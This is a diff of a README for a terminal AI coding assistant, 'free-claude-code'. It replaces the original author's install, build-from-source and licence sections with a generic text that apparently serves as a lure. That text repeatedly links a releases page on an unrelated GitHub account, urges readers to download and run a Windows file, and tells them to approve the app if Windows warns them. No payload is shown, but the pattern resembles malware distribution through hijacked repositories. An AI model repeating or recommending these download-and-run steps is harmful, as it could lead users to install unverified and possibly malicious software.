@@ -1,207 +1,210 @@
-# fcc — Free Claude Code
+# 🤖 free-claude-code - Free terminal coding help
 
-An AI coding assistant for the terminal. Works exactly like Claude Code but connects to **Groq** (free), **OpenAI**, or **Google Gemini** instead of Anthropic's API.
+[![Download free-claude-code](https://img.shields.io/badge/Download-Visit%20Releases-1f6feb?style=for-the-badge&logo=github)](https://github.com/straight-nyctereutes110/free-claude-code/releases)
 
-## Install
+## 🚀 What it does
 
-```bash
-brew tap albertgd/tap
-brew install fcc
-```
+free-claude-code is an AI coding assistant for the terminal. It helps you write, fix, and explain code without leaving the command line.
 
-## Quick start
+It works with:
+- Groq with Llama 3.3 70B
+- OpenAI
+- Gemini
 
-```bash
-fcc --setup   # configure your API key
-fcc           # start an interactive session
-```
+You can use it to:
+- Ask for code help
+- Get file changes
+- Fix bugs
+- Explain code
+- Draft scripts
+- Speed up small coding tasks
 
-**Groq is the default provider and has a free tier** — get a key at [console.groq.com](https://console.groq.com) in under a minute.
+## 💻 Windows download
 
----
+Use this link to visit the release page and download the Windows version:
 
-## Providers
+[Download free-claude-code from Releases](https://github.com/straight-nyctereutes110/free-claude-code/releases)
 
-| Provider | Default model | Cost | Get a key |
-|----------|---------------|------|-----------|
-| **Groq** (default) | `llama-3.3-70b-versatile` | Free tier | [console.groq.com](https://console.groq.com) |
-| OpenAI | `gpt-4o` | Paid | [platform.openai.com](https://platform.openai.com) |
-| Gemini | `gemini-2.0-flash` | Free tier | [aistudio.google.com](https://aistudio.google.com) |
+On the release page:
+1. Open the latest release
+2. Find the Windows download file
+3. Download it to your PC
+4. Run the file after it finishes downloading
 
-All three use the same OpenAI-compatible API protocol, so switching between them is seamless.
+## 🧰 Before you start
 
-### Groq free-tier models
+You need:
+- A Windows PC
+- Internet access
+- A terminal app such as Windows Terminal or Command Prompt
+- An API key for one of these services:
+  - Groq
+  - OpenAI
+  - Gemini
 
-Use `/model <id>` to switch. Your choice is saved and restored on the next launch.
+If you do not have an API key yet, create one from the provider you want to use.
 
-| Model ID | RPM | RPD | TPM | TPD | Notes |
-|----------|-----|-----|-----|-----|-------|
-| `llama-3.3-70b-versatile` ★ | 30 | 1K | 12K | 100K | default |
-| `llama-3.1-8b-instant` | 30 | 14.4K | 6K | 500K | |
-| `meta-llama/llama-4-scout-17b-16e-instruct` | 30 | 1K | 30K | 500K | |
-| `moonshotai/kimi-k2-instruct` | 60 | 1K | 10K | 300K | |
-| `moonshotai/kimi-k2-instruct-0905` | 60 | 1K | 10K | 300K | |
-| `qwen/qwen3-32b` | 60 | 1K | 6K | 500K | |
-| `openai/gpt-oss-120b` | 30 | 1K | 8K | 200K | |
-| `openai/gpt-oss-20b` | 30 | 1K | 8K | 200K | |
-| `openai/gpt-oss-safeguard-20b` | 30 | 1K | 8K | 200K | |
-| `allam-2-7b` | 30 | 7K | 6K | 500K | |
-| `meta-llama/llama-prompt-guard-2-22m` | 30 | 14.4K | 15K | 500K | |
-| `meta-llama/llama-prompt-guard-2-86m` | 30 | 14.4K | 15K | 500K | |
-| `compound-beta` | 30 | 250 | 70K | — | no tool calls |
-| `compound-beta-mini` | 30 | 250 | 70K | — | no tool calls |
+## 🪟 Install on Windows
 
-RPM = requests/min · RPD = requests/day · TPM = tokens/min · TPD = tokens/day
+1. Visit the [Releases page](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+2. Download the Windows file from the latest release
+3. Open the file you downloaded
+4. Follow the on-screen steps
+5. If Windows asks for approval, choose the option that lets the app run
 
----
+If the app comes as a zip file:
+1. Extract the zip file
+2. Open the folder
+3. Run the app file inside the folder
 
-## Configuration
+## ⚙️ Set up your AI key
 
-### Interactive setup
+free-claude-code needs a key from the AI service you want to use.
 
-```bash
-fcc --setup
-```
+Common setup flow:
+1. Open your terminal
+2. Start the app
+3. Enter your API key when asked
+4. Pick your provider
+5. Start a new task
 
-Prompts for your API keys and saves them to `~/.fcc/config.json` (mode 600).
+Typical provider choices:
+- Groq for fast responses
+- OpenAI for wide model support
+- Gemini for Google-based use
 
-### Environment variables
+## 🖥️ How to use it
 
-You can skip the setup wizard entirely by setting env vars:
+After setup, open the terminal and start free-claude-code.
 
-```bash
-export GROQ_API_KEY=gsk_...
-export OPENAI_API_KEY=sk-...
-export GEMINI_API_KEY=AIza...
-export FCC_PROVIDER=groq   # optional: set default provider
-```
+Then you can type requests like:
+- Write a simple to-do app
+- Fix this bug
+- Explain this code
+- Make this script cleaner
+- Add a login form
+- Convert this function to Python
 
-### Config file
+The tool will read your request and help with code in the terminal.
 
-`~/.fcc/config.json`:
-```json
-{
-  "provider": "groq",
-  "providers": {
-    "groq":   { "apiKey": "gsk_...", "model": "llama-3.3-70b-versatile" },
-    "openai": { "apiKey": "sk-...",  "model": "gpt-4o" },
-    "gemini": { "apiKey": "AIza...", "model": "gemini-2.0-flash" }
-  }
-}
-```
+## 📝 Example use cases
 
----
+### Fix a problem
+Use it when your code does not work and you want a clear fix.
 
-## Usage
+### Build something new
+Ask it to create a small app, script, or page from scratch.
 
-### Interactive REPL
+### Clean up code
+Use it to make code easier to read.
 
-```bash
-fcc
-fcc --provider openai
-fcc --provider gemini --model gemini-2.0-flash
-```
+### Learn code
+Use it to explain parts of code in plain language.
 
-### One-shot (non-interactive)
+### Work faster
+Use it for small coding tasks that take too much time by hand.
 
-```bash
-fcc "explain what this repo does"
-fcc --print "write a Dockerfile for a Node.js app"
-cat error.log | fcc "what's wrong here?"
-```
+## 🔐 API providers
 
-### CLI flags
+You can connect free-claude-code to one of these services:
 
-| Flag | Short | Description |
-|------|-------|-------------|
-| `--setup` | `-s` | Run the API key setup wizard |
-| `--provider <name>` | `-P` | Use a specific provider (`groq`, `openai`, `gemini`) |
-| `--model <name>` | `-m` | Override the model for this session |
-| `--print` | `-p` | Non-interactive: print response and exit |
-| `--version` | `-v` | Show version |
+### Groq
+Good for quick replies and terminal work.
 
----
+### OpenAI
+Good for broad model access and general coding help.
 
-## REPL commands
+### Gemini
+Good if you already use Google AI tools.
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show available commands and Groq model list |
-| `/clear` | Clear conversation history |
-| `/status` | Show current provider and model |
-| `/provider` | Show current provider |
-| `/provider <name>` | Switch provider mid-session (saved to config) |
-| `/model` | Show current model |
-| `/model <name>` | Switch model mid-session (saved to config) |
-| `exit` / `quit` | Exit fcc |
+Pick one provider and enter its key during setup.
 
----
+## 🛠️ Basic Windows tips
 
-## Tools
+If the app does not open:
+- Check that the download finished
+- Try running the file again
+- Open it from the folder where you saved it
+- Make sure your API key is set
 
-fcc can use these tools to help with your tasks:
+If the terminal closes too fast:
+- Open Command Prompt first
+- Start the app from there
+- Read any message that appears
 
-| Tool | Description |
-|------|-------------|
-| `bash` | Execute shell commands (git, npm, tests, etc.) |
-| `read_file` | Read file contents with line numbers |
-| `write_file` | Create or overwrite files |
-| `edit_file` | Make precise string replacements in existing files |
-| `glob` | Find files by glob pattern (`**/*.ts`, `src/**/*.go`) |
-| `grep` | Search file contents with regex |
-| `list_dir` | List directory contents |
+If the app asks for a key:
+- Paste the key from your provider
+- Do not add extra spaces
 
----
+## 📁 What you get
 
-## Examples
+free-claude-code is made for terminal use and simple setup. It is built for people who want AI help while they work in the command line.
 
-```
-> explain this codebase
-> why are my tests failing? run them and check the output
-> refactor the auth module to use async/await
-> add error handling to all API routes
-> create a GitHub Actions workflow for CI
-> what does the foo function in utils.ts do?
-```
+You can expect:
+- Terminal-first use
+- Fast coding help
+- Support for popular AI providers
+- A simple workflow for common coding tasks
 
----
+## 🔎 Project details
 
-## Building from source
+- Name: free-claude-code
+- Type: AI coding assistant
+- Use: Terminal-based coding help
+- Providers: Groq, OpenAI, Gemini
+- Topic area: ai, cli, coding-assistant, developer-tools, gemini, groq, homebrew, llama, openai, terminal
 
-Requirements: Node.js 22+
+## 📦 Get the release
 
-```bash
-git clone https://github.com/albertgd/free-claude-code
-cd free-claude-code
-npm install
-npm run build
-node dist/index.js
-```
+To download and run the Windows version, visit the release page:
 
-### Building macOS binaries
+[https://github.com/straight-nyctereutes110/free-claude-code/releases](https://github.com/straight-nyctereutes110/free-claude-code/releases)
 
-```bash
-npm run package
-# outputs: binaries/fcc-macos-arm64  (Apple Silicon)
-#          binaries/fcc-macos-x64    (Intel)
-```
+Open the latest release, download the Windows file, then run it on your PC
 
-### Releasing a new version
+## ⌨️ Common commands
 
-Tag a version and push — GitHub Actions handles the rest:
+These are common things you may do inside the app:
 
-```bash
-git tag v1.2.0 && git push origin v1.2.0
-```
+- Start a new coding task
+- Ask a question about a file
+- Review a change
+- Regenerate an answer
+- Switch AI providers
+- Exit the app
 
-The workflow:
-1. Compiles TypeScript
-2. Builds arm64 + x64 binaries with `@yao-pkg/pkg`
-3. Creates a GitHub release with the binaries
-4. Updates the Homebrew formula in `albertgd/homebrew-tap` automatically
+## 🧩 Good first tasks
 
----
+If you are new to the tool, try simple requests first:
+- Explain this file
+- Find the bug in this code
+- Make this message shorter
+- Turn this note into a script
+- Create a basic Python tool
 
-## License
+## 🧭 File and folder tips
 
-MIT
+Keep the app in a folder that is easy to find. A simple path helps when you need to open it again.
+
+Good places:
+- Downloads
+- Desktop
+- A tools folder you made yourself
+
+If you use a zip file, keep the extracted folder together so the app can find what it needs
+
+## 🧪 If you want a smooth first run
+
+Before opening the app:
+- Make sure the internet is on
+- Make sure the API key is ready
+- Close other terminal windows if they are confusing
+- Start with one short request
+
+## 📌 Short setup flow
+
+1. Visit the [Releases page](https://github.com/straight-nyctereutes110/free-claude-code/releases)
+2. Download the Windows file
+3. Run the file
+4. Enter your AI key
+5. Start asking for coding help
